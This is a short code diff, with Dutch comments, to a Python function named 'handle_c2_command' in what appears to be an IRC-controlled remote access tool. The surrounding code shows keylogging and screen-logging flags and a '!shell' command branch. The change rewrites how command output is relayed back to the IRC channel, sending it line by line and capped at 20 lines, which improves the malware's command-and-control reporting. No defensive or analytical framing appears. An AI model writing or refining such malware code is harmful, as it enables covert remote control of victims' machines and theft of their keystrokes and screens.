@@ -333,8 +333,13 @@ def handle_c2_command(msg, send_fn, channel):
     global logKeys, logScreen, logging
 
     def reply(text):
-        for chunk in [text[i:i+400] for i in range(0, min(len(text), 3200), 400)]:
-            send_fn(f'PRIVMSG {channel} :{chunk}')
+        # Splits op regeleindes zodat output leesbaar blijft, max 20 regels
+        lines = [l.rstrip('\r') for l in text.split('\n') if l.strip()]
+        if not lines:
+            send_fn(f'PRIVMSG {channel} :(geen output)')
+            return
+        for line in lines[:20]:
+            send_fn(f'PRIVMSG {channel} :{line[:400]}')
 
     if msg.startswith('!shell '):
         cmd = msg[7:]
